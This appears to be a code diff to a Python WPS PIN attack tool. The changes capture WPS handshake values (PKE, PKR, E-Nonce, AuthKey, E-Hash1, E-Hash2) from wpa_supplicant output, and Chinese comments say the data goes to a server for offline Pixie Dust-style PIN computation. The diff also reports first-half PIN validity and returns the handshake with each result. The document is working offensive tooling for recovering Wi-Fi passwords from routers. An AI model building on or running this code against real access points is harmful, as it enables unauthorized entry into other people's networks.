@@ -29,18 +29,37 @@ def get_hex(line):
 
 
 class ConnectionStatus:
+    # WPS 握手关键数据（hex 大写），用于服务端离线计算随机数缺陷漏洞 PIN。
+    HANDSHAKE_FIELDS = ('pke', 'pkr', 'e_nonce', 'authkey', 'e_hash1', 'e_hash2')
+
     def __init__(self):
         self.status = ''
-        self.last_m_message = 0
+        self.first_half_valid = False
         self.essid = ''
         self.wpa_psk = ''
         self.bssid = ''
         self.wsc_done_built = False
         self.wps_success_received = False
         self.protocol_completed = False
+        self.pke = ''
+        self.pkr = ''
+        self.e_nonce = ''
+        self.authkey = ''
+        self.e_hash1 = ''
+        self.e_hash2 = ''
 
     def isFirstHalfValid(self):
-        return self.last_m_message > 5
+        return self.first_half_valid
+
+    def got_all(self):
+        return all(getattr(self, name) for name in self.HANDSHAKE_FIELDS)
+
+    def handshake(self):
+        if not self.got_all():
+            return None
+        return dict(pke=self.pke, pkr=self.pkr, eNonce=self.e_nonce,
+                    authKey=self.authkey, eHash1=self.e_hash1,
+                    eHash2=self.e_hash2, essid=self.essid)
 
     def clear(self):
         self.__init__()
@@ -190,32 +209,37 @@ class Companion:
                 self.__print_with_indicators('*', 'Sending WPS Message WSC_Done…')
             elif 'Building Message M' in line:
                 n = int(line.split('Building Message M')[1].replace('D', ''))
-                self.connection_status.last_m_message = n
                 self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
             elif 'Received M2D' in line:
                 self.__print_with_indicators('*', 'Received WPS Message M2D')
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
-                self.connection_status.last_m_message = n
                 self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                 if n == 5:
+                    self.connection_status.first_half_valid = True
                     print('[+] The first half of the PIN is valid')
             elif 'Received WSC_NACK' in line:
                 self.connection_status.status = 'WSC_NACK'
                 self.__print_with_indicators('*', 'Received WSC NACK')
                 print('[-] Error: wrong PIN code')
             elif 'Enrollee Nonce' in line and 'hexdump' in line:
-                print('[P] E-Nonce: {}'.format(get_hex(line)))
+                self.connection_status.e_nonce = get_hex(line)
+                print('[P] E-Nonce: {}'.format(self.connection_status.e_nonce))
             elif 'DH own Public Key' in line and 'hexdump' in line:
-                print('[P] PKR: {}'.format(get_hex(line)))
+                self.connection_status.pkr = get_hex(line)
+                print('[P] PKR: {}'.format(self.connection_status.pkr))
             elif 'DH peer Public Key' in line and 'hexdump' in line:
-                print('[P] PKE: {}'.format(get_hex(line)))
+                self.connection_status.pke = get_hex(line)
+                print('[P] PKE: {}'.format(self.connection_status.pke))
             elif 'AuthKey' in line and 'hexdump' in line:
-                print('[P] AuthKey: {}'.format(get_hex(line)))
+                self.connection_status.authkey = get_hex(line)
+                print('[P] AuthKey: {}'.format(self.connection_status.authkey))
             elif 'E-Hash1' in line and 'hexdump' in line:
-                print('[P] E-Hash1: {}'.format(get_hex(line)))
+                self.connection_status.e_hash1 = get_hex(line)
+                print('[P] E-Hash1: {}'.format(self.connection_status.e_hash1))
             elif 'E-Hash2' in line and 'hexdump' in line:
-                print('[P] E-Hash2: {}'.format(get_hex(line)))
+                self.connection_status.e_hash2 = get_hex(line)
+                print('[P] E-Hash2: {}'.format(self.connection_status.e_hash2))
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
@@ -629,6 +653,7 @@ def persistent_fifo_main(interface, command_pipe, event_pipe):
             success = False
             network = None
             message = ''
+            state = None
             request_nl = None
             original_flags = None
             original_mac = None
@@ -680,6 +705,8 @@ def persistent_fifo_main(interface, command_pipe, event_pipe):
                 check_running()
                 companion = Companion(interface, bssid=bssid, exclude_macs=[mac.upper() for mac in excluded],
                                       complete_protocol=request.get('completeProtocol', True), check_running=check_running)
+                # 立即绑定状态对象，即使后续抛异常也能回传已捕获的握手数据。
+                state = companion.connection_status
                 if managed_connect.read_mac(request_nl) != actual_mac:
                     raise RuntimeError('Private supplicant changed the selected local MAC')
                 success = companion.single_connection(bssid=bssid, pin=pin, pbc_mode=mode == 'pbc')
@@ -724,9 +751,12 @@ def persistent_fifo_main(interface, command_pipe, event_pipe):
                     request_nl.close()
                 with lock:
                     active_request[0] = None
+            # 实际收到 M5 的事实与握手数据随结果回传；实时阶段通过 progress 事件发送。
             emit('result', requestId=request_id, success=bool(success), network=network,
                  message=message, cleanupCompleted=cleanup_completed,
-                 localMac=actual_mac.hex(':') if actual_mac is not None else None)
+                 localMac=actual_mac.hex(':') if actual_mac is not None else None,
+                 firstHalfValid=bool(state.isFirstHalfValid()) if state is not None else False,
+                 handshake=(state.handshake() if state is not None else None))
             if not cleanup_completed:
                 break
     except Exception as error:
